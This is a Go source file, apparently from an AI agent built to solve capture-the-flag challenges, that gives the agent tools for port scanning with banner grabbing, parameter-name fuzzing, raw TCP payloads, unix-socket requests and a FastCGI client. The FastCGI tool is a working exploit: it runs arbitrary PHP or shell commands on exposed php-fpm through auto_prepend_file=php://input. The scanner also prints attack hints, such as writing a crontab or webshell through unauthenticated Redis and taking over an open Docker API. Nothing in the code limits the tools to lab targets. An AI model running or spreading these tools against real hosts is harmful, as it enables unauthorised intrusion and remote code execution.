package kernel

// 本文件是 A01–A18 实战复盘后新增的「基础设施层」工具。
//
// 设计原则：这些工具提供的是**协议与探测能力**，不含任何题目/平台知识。
//
//  1. ports：很多题的真正入口是**没经过前置网关的旁路端口**（应用层服务、缓存、容器 API）。
//     只扫 80/8080 会直接错过主线，所以需要一次调用覆盖常见端口 + 协议指纹。
//  2. paramfuzz：服务端返回固定错误串时，说明它在找一个你不认识的参数名；
//     需要以「错误串」为 oracle 的大字典爆破，而不是试几十个就判死。
//  3. fcgi：FastCGI 记录头（version/type/requestId/contentLength/padding/reserved
//     六字段）手写极易出错，内置客户端让「说上话」变成一次调用。
//  4. unix：容器内的本地 agent 常只监听 unix socket；这是继 TCP/HTTP 之后的第三条通道。
//
// 所有工具都与平台无关，只吃 host/port/url。

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	neturl "net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"ctfagent/internal/llm"
)

// ---------------------------------------------------------------------------
// ports：全端口扫描 + 协议指纹
// ---------------------------------------------------------------------------

// 常见服务端口（先扫这批，命中的服务优先展示）
var quickPorts = []int{
	21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
	1080, 1433, 1521, 2049, 2181, 2375, 2376, 3000, 3128, 3306, 3389, 4000,
	4369, 5000, 5001, 5432, 5555, 5601, 5672, 5900, 5984, 6000, 6379, 6443,
	7001, 7002, 8000, 8001, 8008, 8009, 8010, 8020, 8040, 8069, 8080, 8081,
	8082, 8083, 8088, 8090, 8161, 8180, 8181, 8190, 8200, 8300, 8443, 8500,
	8880, 8888, 8983, 9000, 9001, 9002, 9042, 9080, 9090, 9091, 9100, 9200,
	9300, 9418, 9999, 10000, 10250, 11211, 15672, 16379, 27017, 27018, 50000,
	50070, 61616,
}

func (t *ToolSet) doPorts(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		Host      string `json:"host"`
		Ports     string `json:"ports"` // "quick" | "all" | "80,443,9000" | "1-10000"
		Threads   int    `json:"threads"`
		TimeoutMS int    `json:"timeout_ms"`
		Banner    bool   `json:"banner"`
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	host := strings.TrimSpace(a.Host)
	if host == "" {
		return "host 必填（例如 10.0.0.5 或 http://10.0.0.5:8080）"
	}
	if strings.Contains(host, "://") {
		if u, err := parseURL(host); err == nil && u.Hostname() != "" {
			host = u.Hostname()
		}
	}
	ports := expandPorts(a.Ports)
	if len(ports) == 0 {
		return "ports 解析为空：用 quick / all / 9000 / 1-10000 / 80,443"
	}
	threads := a.Threads
	if threads <= 0 {
		threads = 300
	}
	if threads > 1000 {
		threads = 1000
	}
	toMS := a.TimeoutMS
	if toMS <= 0 {
		toMS = 900
	}
	to := time.Duration(toMS) * time.Millisecond

	type openPort struct {
		port   int
		banner string
	}
	var mu sync.Mutex
	var open []openPort
	var scanned int64
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup
	start := time.Now()
	for _, p := range ports {
		p := p
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			atomic.AddInt64(&scanned, 1)
			if ctx.Err() != nil {
				return
			}
			d := net.Dialer{Timeout: to}
			conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(p)))
			if err != nil {
				return
			}
			defer conn.Close()
			bn := ""
			if a.Banner || isInterestingPort(p) {
				bn = grabBanner(conn, host, p, to)
			}
			mu.Lock()
			open = append(open, openPort{p, bn})
			mu.Unlock()
		}()
	}
	wg.Wait()
	sort.Slice(open, func(i, j int) bool { return open[i].port < open[j].port })

	var b strings.Builder
	fmt.Fprintf(&b, "== ports %s（扫了 %d 个端口，开放 %d 个，用时 %.1fs）==\n",
		host, atomic.LoadInt64(&scanned), len(open), time.Since(start).Seconds())
	if len(open) == 0 {
		b.WriteString("没有开放端口。若目标应可达，检查网络/端口参数。\n")
		return b.String()
	}
	for _, o := range open {
		svc := guessService(o.port, o.banner)
		fmt.Fprintf(&b, "%-6d %-22s %s\n", o.port, svc, oneLine(o.banner))
	}
	// 高价值提示：非 HTTP 但可 RCE / 可读数据的老服务
	var hints []string
	for _, o := range open {
		switch {
		case o.port == 9000 || strings.Contains(strings.ToLower(o.banner), "fastcgi"):
			hints = append(hints, fmt.Sprintf("端口 %d 疑似 php-fpm/FastCGI：用工具 fcgi(host,port) 直接执行 PHP（PHP_VALUE=auto_prepend_file=php://input）", o.port))
		case o.port == 6379:
			hints = append(hints, "6379 Redis：试 redis-cli -h HOST 直连（无密码→CONFIG GET dir / 写 crontab / 写 webshell）")
		case o.port == 3306:
			hints = append(hints, "3306 MySQL：试 root 空密码/弱口令直连，或从泄露配置里取凭据")
		case o.port == 11211:
			hints = append(hints, "11211 memcached：stats 可泄露 keys")
		case o.port == 2375:
			hints = append(hints, "2375 Docker API 无 TLS：/containers/json 直接接管")
		case o.port == 5000 || o.port == 5001:
			hints = append(hints, fmt.Sprintf("端口 %d 常见 Flask/内部 API：直接请求并枚举 /debug/config 之类的调试路由", o.port))
		}
	}
	if len(hints) > 0 {
		b.WriteString("\n【下一步建议】\n")
		for _, h := range hints {
			b.WriteString("- " + h + "\n")
		}
	}
	return b.String()
}

func isInterestingPort(p int) bool {
	switch p {
	case 22, 80, 443, 3000, 5000, 8000, 8080, 8443, 8888, 9000, 9090, 10000, 3306, 6379, 11211, 27017, 5432:
		return true
	}
	return false
}

func expandPorts(spec string) []int {
	spec = strings.ToLower(strings.TrimSpace(spec))
	switch spec {
	case "", "quick":
		return quickPorts
	case "all", "full":
		out := make([]int, 0, 65535)
		for i := 1; i <= 65535; i++ {
			out = append(out, i)
		}
		return out
	}
	var out []int
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		if strings.Contains(part, "-") {
			se := strings.SplitN(part, "-", 2)
			lo, e1 := strconv.Atoi(strings.TrimSpace(se[0]))
			hi, e2 := strconv.Atoi(strings.TrimSpace(se[1]))
			if e1 != nil || e2 != nil || hi < lo {
				continue
			}
			if hi-lo > 65535 {
				hi = lo + 65535
			}
			for p := lo; p <= hi; p++ {
				if p >= 1 && p <= 65535 {
					out = append(out, p)
				}
			}
			continue
		}
		if n, err := strconv.Atoi(part); err == nil && n >= 1 && n <= 65535 {
			out = append(out, n)
		}
	}
	return out
}

// grabBanner 对已建立的连接做一次「被动读 + 主动探」。
// 目的不是精确识别，而是把「这是不是 HTTP / 是不是 FastCGI / 是不是 MySQL」区分开，
// 因为后续打法完全不同。
func grabBanner(conn net.Conn, host string, port int, to time.Duration) string {
	_ = conn.SetDeadline(time.Now().Add(to))
	buf := make([]byte, 512)
	switch port {
	case 80, 443, 3000, 5000, 5001, 8000, 8001, 8080, 8081, 8082, 8088, 8090, 8180, 8181, 8443, 8888, 9001, 9090, 10000, 15672, 50070:
		fmt.Fprintf(conn, "GET / HTTP/1.0\r\nHost: %s\r\nUser-Agent: ctfagent\r\n\r\n", host)
	case 9000:
		// php-fpm 不会主动说话。发一个极小的 BEGIN_REQUEST，若回的是
		// FastCGI 记录（首字节 version=1），直接判定；否则再退化到 HTTP 探。
		// 注意：对真正的 php-fpm 绝不能发 HTTP 请求，否则会把二进制响应糊进 banner。
		// 探针必须是「完整」的一轮 FastCGI：只有 BEGIN_REQUEST 时 php-fpm 会一直等
		// PARAMS/STDIN，表现为静默，容易漏报。
		_ = fcgiWrite(conn, fcgiBeginRequest, []byte{0, 1, 0, 0, 0, 0, 0, 0}, 1)
		var pb bytes.Buffer
		pb.Write(fcgiNV("SCRIPT_FILENAME", "/var/www/html/index.php"))
		pb.Write(fcgiNV("REQUEST_METHOD", "GET"))
		_ = fcgiWrite(conn, fcgiParams, pb.Bytes(), 1)
		_ = fcgiWrite(conn, fcgiParams, nil, 1)
		_ = fcgiWrite(conn, fcgiStdin, nil, 1)
		d := 2 * time.Second
		if to > d {
			d = to
		}
		_ = conn.SetDeadline(time.Now().Add(d))
		n, _ := conn.Read(buf)
		if n > 0 && buf[0] == 1 {
			return "FastCGI(php-fpm)"
		}
		return ""
	case 3306, 5432, 6379, 11211, 27017, 21, 22, 25, 110, 143, 23, 5900:
		// 主动打招呼的服务：直接等它说话
	default:
		fmt.Fprintf(conn, "GET / HTTP/1.0\r\nHost: %s\r\n\r\n", host)
	}
	n, err := conn.Read(buf)
	if n <= 0 {
		if err != nil && strings.Contains(err.Error(), "timeout") {
			return "(无 banner，端口开放)"
		}
		return ""
	}
	banner := strings.TrimSpace(string(buf[:n]))
	if len(banner) > 200 {
		banner = banner[:200] + "…"
	}
	return banner
}

func guessService(port int, banner string) string {
	low := strings.ToLower(banner)
	switch {
	case strings.HasPrefix(low, "http/") || strings.Contains(low, "server:") || port == 80:
		return "http"
	case strings.Contains(low, "fastcgi"):
		return "php-fpm/FastCGI"
	case strings.Contains(low, "mysql") || port == 3306:
		return "mysql"
	case port == 6379:
		return "redis"
	case port == 5432:
		return "postgres"
	case port == 11211:
		return "memcached"
	case port == 27017:
		return "mongodb"
	case strings.HasPrefix(low, "ssh-"):
		return "ssh"
	case strings.HasPrefix(low, "220") || port == 21:
		return "ftp"
	case port == 22:
		return "ssh?"
	case port == 9000:
		return "php-fpm?(静默)"
	case port == 443 || port == 8443 || port == 6443:
		return "https?"
	}
	return "unknown"
}

// ---------------------------------------------------------------------------
// paramfuzz：参数名爆破（用错误串/长度做 oracle）
// ---------------------------------------------------------------------------

// 背景：前端 JS 里的参数名经常与服务端不一致（改名未同步 / 演示版前端 / 故意误导）。
// 服务端用固定错误串拒绝时，试几十个名字很容易误判"接口坏了"。
// 正确做法：拿真实错误串当 oracle，跑数千个候选名，只看响应变化。

func (t *ToolSet) doParamFuzz(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		URL      string            `json:"url"`
		Method   string            `json:"method"`
		Baseline string            `json:"baseline"` // 基准响应的独有特征串（如 "URL is required"）
		Value    string            `json:"value"`    // 给每个候选参数填的值
		Location string            `json:"location"` // body(默认 json) / query / form
		Words    []string          `json:"words"`
		Headers  map[string]string `json:"headers"`
		Threads  int               `json:"threads"`
		TimeoutS int               `json:"timeout_s"`
		ScanAll  bool              `json:"scan_all"`
		MaxScan  int               `json:"max_scan"`
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	if a.URL == "" {
		return "url 必填"
	}
	method := strings.ToUpper(strings.TrimSpace(a.Method))
	if method == "" {
		method = "POST"
	}
	loc := strings.ToLower(strings.TrimSpace(a.Location))
	if loc == "" {
		loc = "body"
	}
	val := a.Value
	if val == "" {
		val = "http://127.0.0.1:1/"
	}
	words := a.Words
	if len(words) == 0 {
		// 公开单词词典 + 组合规则生成的复合名（<名词>_<类别>）
		words = append(append([]string{}, loadEmbeddedWordlist("params")...), expandCompoundParams()...)
	}
	if len(words) == 0 {
		return "没有可用字典"
	}
	threads := a.Threads
	if threads <= 0 {
		threads = 50
	}
	if threads > 200 {
		threads = 200
	}
	to := secs(a.TimeoutS)
	if to <= 0 {
		to = 8 * time.Second
	}
	if a.MaxScan > 0 && a.MaxScan < len(words) {
		words = words[:a.MaxScan]
	}
	client := &http.Client{Timeout: to, Jar: t.jar, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	type result struct {
		status int
		body   string
	}
	do := func(payloadParam string) result {
		var req *http.Request
		var err error
		switch loc {
		case "query":
			sep := "?"
			if strings.Contains(a.URL, "?") {
				sep = "&"
			}
			req, err = http.NewRequestWithContext(ctx, method, a.URL+sep+payloadParam+"="+urlQueryEscape(val), nil)
		case "form":
			form := payloadParam + "=" + urlQueryEscape(val)
			req, err = http.NewRequestWithContext(ctx, method, a.URL, strings.NewReader(form))
			if err == nil {
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}
		default:
			body, _ := json.Marshal(map[string]string{payloadParam: val})
			req, err = http.NewRequestWithContext(ctx, method, a.URL, bytes.NewReader(body))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
			}
		}
		if err != nil {
			return result{0, "ERR " + err.Error()}
		}
		for k, v := range a.Headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return result{0, "ERR " + err.Error()}
		}
		defer resp.Body.Close()
		raw, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		return result{resp.StatusCode, string(raw)}
	}

	// 1) 基准：先发一个明显不存在的参数名，拿到真实基线
	base := do("__ctfagent_no_such_param__")
	baseSig := a.Baseline
	if baseSig == "" {
		baseSig = base.body
	}
	baseLen := len(base.body)

	type hit struct {
		word string
		st   int
		size int
		body string
	}
	var mu sync.Mutex
	var hits []hit
	var stop int32
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup
	// 热门词优先：常见参数名排前面，命中即停时能几秒内出结果
	ordered := orderCandidates(words)
	for _, w := range ordered {
		w := w
		if !a.ScanAll && atomic.LoadInt32(&stop) == 1 {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			if ctx.Err() != nil {
				return
			}
			r := do(w)
			// 判定「有变化」：状态码变 / 响应体不再包含基线特征串 / 长度差异明显
			changed := r.status != base.status ||
				(baseSig != "" && !strings.Contains(r.body, baseSig)) ||
				absInt(len(r.body)-baseLen) > 40
			if !changed {
				return
			}
			mu.Lock()
			hits = append(hits, hit{w, r.status, len(r.body), r.body})
			mu.Unlock()
			if !a.ScanAll {
				atomic.StoreInt32(&stop, 1)
			}
		}()
	}
	wg.Wait()
	sort.Slice(hits, func(i, j int) bool { return hits[i].size < hits[j].size })

	var b strings.Builder
	fmt.Fprintf(&b, "== paramfuzz %s（%s，%d 个候选，基线 %d/%dB）==\n", a.URL, method, len(words), base.status, baseLen)
	fmt.Fprintf(&b, "基线响应片段：%s\n\n", oneLine(trimSnippet(base.body, 160)))
	if len(hits) == 0 {
		b.WriteString("没有参数名引起响应变化。\n提示：\n")
		b.WriteString("- 换 location（body/query/form）再试；有的接口只读 query。\n")
		b.WriteString("- 换 value（参数存在但值被校验时，响应=另一种错误，也算命中）。\n")
		b.WriteString("- 若返回 500，说明 `.get()` 拿到了非 dict，参数名可能对了但值类型不对。\n")
		return b.String()
	}
	fmt.Fprintf(&b, "命中 %d 个：\n", len(hits))
	for i, h := range hits {
		if i >= 40 {
			b.WriteString("…（仅显示前 40 条）\n")
			break
		}
		fmt.Fprintf(&b, "%-28s %d %dB  %s\n", h.word, h.st, h.size, oneLine(trimSnippet(h.body, 120)))
	}
	return b.String()
}

func trimSnippet(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func absInt(n int) int {
	if n < 0 {
		return -n
	}
	return n
}

// ---------------------------------------------------------------------------
// fcgi：php-fpm / FastCGI 直接执行 PHP
// ---------------------------------------------------------------------------

// 背景：php-fpm 常直接暴露在非标准端口，不经过前置网关的认证，直连即可执行 PHP。
// 关键三件套：
//   SCRIPT_FILENAME=<站点里存在的 .php>
//   PHP_VALUE=auto_prepend_file=php://input
//   PHP_ADMIN_VALUE=allow_url_include=On
// body 放 PHP 代码即可执行。phar/pearcmd 之类都绕不开的 disable_functions 场景也吃这套。

func (t *ToolSet) doFCGI(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		Host      string            `json:"host"`
		Port      int               `json:"port"`
		Script    string            `json:"script"`  // 默认 /var/www/html/index.php
		Code      string            `json:"code"`    // PHP 代码（可省略 <?php）
		Command   string            `json:"command"` // 便捷：直接跑 shell 命令
		QueryStr  string            `json:"query"`   // 可选 QUERY_STRING
		ReqURI    string            `json:"req_uri"` // 可选 REQUEST_URI
		TimeoutS  int               `json:"timeout_s"`
		ExtraVars map[string]string `json:"extra_vars"` // 额外 FastCGI 参数（PHP_VALUE 等可覆盖）
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	host := strings.TrimSpace(a.Host)
	if host == "" {
		return "host 必填"
	}
	if strings.Contains(host, "://") {
		if u, err := parseURL(host); err == nil && u.Hostname() != "" {
			host = u.Hostname()
		}
	}
	port := a.Port
	if port <= 0 {
		port = 9000
	}
	script := a.Script
	if script == "" {
		script = "/var/www/html/index.php"
	}
	code := a.Code
	if strings.TrimSpace(code) == "" && strings.TrimSpace(a.Command) != "" {
		code = "<?php echo shell_exec(" + phpQuote(a.Command) + "); exit;"
	}
	if strings.TrimSpace(code) == "" {
		code = "<?php echo 'PWN:'.php_uname().\"\\n\"; echo 'UID:'.posix_getuid().\"\\n\"; exit;"
	}
	// 允许省略 <?php 前缀
	if !strings.HasPrefix(strings.TrimSpace(code), "<?") {
		code = "<?php " + code
		if !strings.Contains(code, "exit") {
			code += " exit;"
		}
	}
	to := secs(a.TimeoutS)
	if to <= 0 {
		to = 20 * time.Second
	}
	params := map[string]string{
		"GATEWAY_INTERFACE": "FastCGI/1.0",
		"REQUEST_METHOD":    "POST",
		"SCRIPT_FILENAME":   script,
		"SCRIPT_NAME":       "/" + strings.TrimPrefix(baseName(script), "/"),
		"REQUEST_URI":       firstNonEmpty(a.ReqURI, "/"+baseName(script)),
		"DOCUMENT_ROOT":     strings.TrimSuffix(script, "/"+baseName(script)),
		"SERVER_PROTOCOL":   "HTTP/1.1",
		"SERVER_SOFTWARE":   "nginx",
		"SERVER_NAME":       "localhost",
		"SERVER_PORT":       "80",
		"REMOTE_ADDR":       "127.0.0.1",
		"REMOTE_PORT":       "44444",
		"CONTENT_TYPE":      "application/x-www-form-urlencoded",
		"CONTENT_LENGTH":    strconv.Itoa(len(code)),
		"QUERY_STRING":      a.QueryStr,
		"PHP_VALUE":         "auto_prepend_file=php://input",
		"PHP_ADMIN_VALUE":   "allow_url_include=On",
	}
	for k, v := range a.ExtraVars {
		params[k] = v
	}
	out, err := fcgiExec(ctx, host, port, params, []byte(code), to)
	if err != nil {
		return fmt.Sprintf("FastCGI 失败：%v\n排查：1) 端口是否真的是 php-fpm（先 ports 扫）2) SCRIPT_FILENAME 是否是站点里真实存在的 .php（用 fcgi 试 /var/www/html/index.php、/index.php）", err)
	}
	return out
}

func baseName(p string) string {
	p = strings.TrimSuffix(p, "/")
	if i := strings.LastIndex(p, "/"); i >= 0 {
		return p[i+1:]
	}
	return p
}

func firstNonEmpty(xs ...string) string {
	for _, x := range xs {
		if strings.TrimSpace(x) != "" {
			return x
		}
	}
	return ""
}

func phpQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `\'`) + "'"
}

func fcgiExec(ctx context.Context, host string, port int, params map[string]string, body []byte, to time.Duration) (string, error) {
	d := net.Dialer{Timeout: to}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return "", err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(to))

	var pbuf bytes.Buffer
	for k, v := range params {
		pbuf.Write(fcgiNV(k, v))
	}
	if err := fcgiWrite(conn, fcgiBeginRequest, []byte{0, 1, 0, 0, 0, 0, 0, 0}, 1); err != nil {
		return "", err
	}
	if err := fcgiWrite(conn, fcgiParams, pbuf.Bytes(), 1); err != nil {
		return "", err
	}
	if err := fcgiWrite(conn, fcgiParams, nil, 1); err != nil {
		return "", err
	}
	if err := fcgiWrite(conn, fcgiStdin, body, 1); err != nil {
		return "", err
	}
	if err := fcgiWrite(conn, fcgiStdin, nil, 1); err != nil {
		return "", err
	}

	var out bytes.Buffer
	hdr := make([]byte, 8)
	for {
		if _, err := io.ReadFull(conn, hdr); err != nil {
			break
		}
		rtype := hdr[1]
		clen := int(binary.BigEndian.Uint16(hdr[4:6]))
		plen := int(hdr[6])
		data := make([]byte, clen)
		if clen > 0 {
			if _, err := io.ReadFull(conn, data); err != nil {
				break
			}
		}
		if plen > 0 {
			io.CopyN(io.Discard, conn, int64(plen))
		}
		if rtype == fcgiStdout || rtype == fcgiStderr {
			out.Write(data)
		}
		if rtype == fcgiEndRequest {
			break
		}
	}
	txt := out.String()
	// 去掉 CGI 响应头，只留 body
	if i := strings.Index(txt, "\r\n\r\n"); i >= 0 {
		hdrPart := txt[:i]
		txt = txt[i+4:]
		if strings.Contains(strings.ToLower(hdrPart), "status: 500") {
			txt = "[HTTP 500 from php-fpm]\n" + txt
		}
	}
	return strings.TrimRight(txt, "\x00"), nil
}

const (
	fcgiBeginRequest = 1
	fcgiEndRequest   = 3
	fcgiParams       = 4
	fcgiStdin        = 5
	fcgiStdout       = 6
	fcgiStderr       = 7
)

func fcgiWrite(w io.Writer, rtype byte, content []byte, reqID uint16) error {
	// 记录头：version(B) type(B) requestId(H) contentLength(H) paddingLength(B) reserved(B)
	const maxChunk = 60000
	for {
		chunk := content
		if len(chunk) > maxChunk {
			chunk = chunk[:maxChunk]
		}
		pad := (8 - len(chunk)%8) % 8
		hdr := []byte{1, rtype, byte(reqID >> 8), byte(reqID), byte(len(chunk) >> 8), byte(len(chunk)), byte(pad), 0}
		if _, err := w.Write(hdr); err != nil {
			return err
		}
		if len(chunk) > 0 {
			if _, err := w.Write(chunk); err != nil {
				return err
			}
		}
		if pad > 0 {
			if _, err := w.Write(make([]byte, pad)); err != nil {
				return err
			}
		}
		content = content[len(chunk):]
		if len(content) == 0 {
			return nil
		}
	}
}

func fcgiNV(name, value string) []byte {
	var b bytes.Buffer
	writeLen := func(n int) {
		if n < 128 {
			b.WriteByte(byte(n))
		} else {
			var x [4]byte
			binary.BigEndian.PutUint32(x[:], uint32(n)|0x80000000)
			b.Write(x[:])
		}
	}
	writeLen(len(name))
	writeLen(len(value))
	b.WriteString(name)
	b.WriteString(value)
	return b.Bytes()
}

// ---------------------------------------------------------------------------
// unix：走 unix domain socket 发 HTTP 请求（metadata agent 等）
// ---------------------------------------------------------------------------

// 背景：容器内的本地 agent（metadata / supervisor / runtime api）常只监听 unix socket，
// 权限往往比普通文件宽松。等价于 curl --unix-socket <sock> http://<host><path>。

func (t *ToolSet) doUnixHTTP(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		Socket  string `json:"socket"`
		Path    string `json:"path"`
		Method  string `json:"method"`
		Host    string `json:"host"`
		Body    string `json:"body"`
		Command string `json:"command"` // 便捷：不抓包，直接在目标上跑 curl --unix-socket（需要能执行命令）
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	if strings.TrimSpace(a.Command) != "" {
		return t.doShell(ctx, llm.ToolCall{Name: "sh", Args: string(mustJSON(map[string]any{
			"command": a.Command, "timeout_s": 30}))})
	}
	sock := a.Socket
	if sock == "" {
		sock = "/run/app/agent.sock"
	}
	path := a.Path
	if path == "" {
		path = "/latest/flag"
	}
	method := strings.ToUpper(firstNonEmpty(a.Method, "GET"))
	hostHdr := firstNonEmpty(a.Host, "localhost")
	tr := &http.Transport{
		DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
			var d net.Dialer
			return d.DialContext(ctx, "unix", sock)
		},
	}
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
	req, err := http.NewRequestWithContext(ctx, method, "http://"+hostHdr+path, strings.NewReader(a.Body))
	if err != nil {
		return err.Error()
	}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Sprintf("unix socket 请求失败：%v\n排查：socket 路径是否正确（常见 /run/<app>/*.sock、/var/run/*.sock、/tmp/*.sock）；先 `ls -la /run /var/run` 找 *.sock", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return fmt.Sprintf("== unix://%s %s %s -> %d ==\n%s", sock, method, path, resp.StatusCode, string(raw))
}

func mustJSON(v any) []byte {
	b, _ := json.Marshal(v)
	return b
}

// ---------------------------------------------------------------------------
// 附加：HTTP 原始报文（用于 SMTP/Redis/FastCGI 之外的裸协议）
// ---------------------------------------------------------------------------

func (t *ToolSet) doRaw(ctx context.Context, tc llm.ToolCall) string {
	var a struct {
		Host     string `json:"host"`
		Port     int    `json:"port"`
		Payload  string `json:"payload"`
		TimeoutS int    `json:"timeout_s"`
		Hex      string `json:"hex"` // 也支持十六进制载荷
	}
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	if a.Host == "" || a.Port <= 0 {
		return "host 与 port 必填"
	}
	payload := []byte(a.Payload)
	if a.Hex != "" {
		clean := strings.Map(func(r rune) rune {
			if strings.ContainsRune(" \t\r\n:-", r) {
				return -1
			}
			return r
		}, a.Hex)
		if dec, err := decodeHex(clean); err == nil {
			payload = dec
		} else {
			return "hex 解析失败：" + err.Error()
		}
	}
	to := secs(a.TimeoutS)
	if to <= 0 {
		to = 8 * time.Second
	}
	d := net.Dialer{Timeout: to}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(a.Host, strconv.Itoa(a.Port)))
	if err != nil {
		return "连接失败：" + err.Error()
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(to))
	if len(payload) > 0 {
		if _, err := conn.Write(payload); err != nil {
			return "发送失败：" + err.Error()
		}
	}
	var out bytes.Buffer
	br := bufio.NewReader(conn)
	buf := make([]byte, 4096)
	for {
		n, err := br.Read(buf)
		if n > 0 {
			out.Write(buf[:n])
		}
		if err != nil || out.Len() > 1<<20 {
			break
		}
	}
	res := out.String()
	if res == "" {
		return "（无响应；连接已建立，可能服务在等更多数据，或载荷不对）"
	}
	return fmt.Sprintf("== %s:%d 原始响应（%dB）==\n%s", a.Host, a.Port, len(res), printable(res))
}

func printable(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r == '\n' || r == '\r' || r == '\t' || (r >= 32 && r < 127) {
			b.WriteRune(r)
		} else {
			fmt.Fprintf(&b, "\\x%02x", r)
		}
	}
	return b.String()
}

func decodeHex(s string) ([]byte, error) {
	out := make([]byte, 0, len(s)/2)
	for i := 0; i+1 < len(s); i += 2 {
		v, err := strconv.ParseUint(s[i:i+2], 16, 8)
		if err != nil {
			return nil, err
		}
		out = append(out, byte(v))
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// 工具函数
// ---------------------------------------------------------------------------

func parseURL(raw string) (*neturl.URL, error) { return neturl.Parse(raw) }

func urlQueryEscape(s string) string { return neturl.QueryEscape(s) }

// hotParamNames 是「通用高频参数名」的顺序表（不来自任何具体题目）：
// 命中即停时靠它把「几秒出结果」变成可能。顺序按 Web 接口的常见程度排。
var hotParamNames = []string{
	"id", "name", "url", "file", "path", "user", "username", "email", "password", "token",
	"key", "api_key", "action", "type", "mode", "cmd", "command", "exec", "code", "data",
	"json", "body", "content", "query", "q", "search", "lang", "page", "view", "template",
	"tpl", "service", "host", "hostname", "domain", "address", "callback", "redirect", "next",
	"src", "source", "dest", "destination", "remote", "config", "debug", "test", "value",
	"params", "args", "options", "settings", "filename", "uid", "role", "admin", "limit",
	"offset", "count", "size", "sort", "order", "filter", "expr", "rule", "target", "endpoint",
}

// orderByPriority 把 words 里出现在 hot 中的词提到最前（保持其余顺序）。
func orderByPriority(words []string, hot []string) []string {
	hotSet := make(map[string]int, len(hot))
	for i, h := range hot {
		hotSet[h] = i
	}
	var front, rest []string
	for _, w := range words {
		if _, ok := hotSet[w]; ok {
			front = append(front, w)
		} else {
			rest = append(rest, w)
		}
	}
	sort.SliceStable(front, func(i, j int) bool { return hotSet[front[i]] < hotSet[front[j]] })
	return append(front, rest...)
}

// orderCandidates 决定候选名的尝试顺序（命中即停时它直接决定耗时）：
//  1. 通用高频名（id/name/url/file/...）
//  2. 复合名（xxx_url / xxx_endpoint / xxx_path —— 命名约定，命中率很高）
//  3. 公开词典的其余部分
func orderCandidates(words []string) []string {
	compound := make(map[string]bool, 1024)
	for _, w := range expandCompoundParams() {
		compound[w] = true
	}
	hot := make(map[string]int, len(hotParamNames))
	for i, h := range hotParamNames {
		hot[h] = i
	}
	var front, mid, rest []string
	for _, w := range words {
		switch {
		case func() bool { _, ok := hot[w]; return ok }():
			front = append(front, w)
		case compound[w]:
			mid = append(mid, w)
		default:
			rest = append(rest, w)
		}
	}
	sort.SliceStable(front, func(i, j int) bool { return hot[front[i]] < hot[front[j]] })
	return append(append(front, mid...), rest...)
}
